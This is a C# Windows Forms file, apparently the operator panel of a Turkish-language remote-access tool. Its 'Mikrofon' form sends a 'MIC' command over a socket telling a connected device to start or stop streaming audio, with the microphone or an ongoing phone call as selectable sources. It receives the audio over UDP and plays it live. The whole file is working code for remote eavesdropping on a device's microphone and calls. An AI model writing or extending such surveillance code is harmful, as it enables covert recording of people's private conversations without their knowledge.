using NAudio.Wave;
using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;
namespace SV
{
    public partial class Mikrofon : Form
    {
        Recorder rc;
        static Thread play;
        static IPEndPoint ipep;
        static UdpClient newsock;
        Socket sc;
        Dictionary<int, string> source = null;
        public Mikrofon(Socket sock)
        {
            InitializeComponent();
            source = new Dictionary<int, string>()
            {
                { 0, "Mikrofon"},
                { 1, "Varsayılan"},
                { 2, "Telefon Görüşmesi"}
            };
            comboBox1.SelectedItem = "44100";
            comboBox2.SelectedItem = "Default";
            sc = sock;
        }
        class Recorder
        {
            int sample_ = 44100;
            public Recorder(int sample)
            {
                sample_ = sample;
                play = new Thread(new ThreadStart(Play));
                play.Start();

            }
            private void Play()
            {
                try
                {
                    WaveOutEvent output = new WaveOutEvent();
                    BufferedWaveProvider buffer = new BufferedWaveProvider(new WaveFormat(sample_, 16, 1)); //Pürüzsüz bir ses geliyor bu ayarda :)
                    buffer.BufferLength = 2560 * 16;
                    buffer.DiscardOnBufferOverflow = true;
                    output.Init(buffer);
                    output.Play();
                    for (; ; )
                    {
                        try
                        {
                            IPEndPoint remoteEP = null;
                            byte[] data = newsock.Receive(ref remoteEP);
                            buffer.AddSamples(data, 0, data.Length);
                        }
                        catch (Exception) { }
                    }
                }
                catch(Exception) {}
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                Form1.KomutGonder("MIC", "[VERI]BASLA[VERI]" + comboBox1.SelectedItem.ToString() + "[VERI]" + source[comboBox2.SelectedIndex]
                    + "[VERI][0x09]", sc);
                if (ipep == null && newsock == null)
                {
                    ipep = new IPEndPoint(IPAddress.Any, Form1.port_no);
                    newsock = new UdpClient(ipep);

                }
                rc = new Recorder(int.Parse(comboBox1.SelectedItem.ToString()));
                button2.Enabled = true;
                button1.Enabled = false;
            }
            catch (Exception) { }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            try
            {
                Form1.KomutGonder("MIC", "[VERI]DURDUR[VERI][0x09]", sc);
            }
            catch (Exception) { }
            try
            {
                play.Abort();
            }
            catch (Exception) { }
            button2.Enabled = false;
            button1.Enabled = true;
        }

        private void Mikrofon_FormClosing(object sender, FormClosingEventArgs e)
        {
            try
            {
                button2.PerformClick();
                play.Abort();
            }
            catch (Exception) { }
        }
    }
}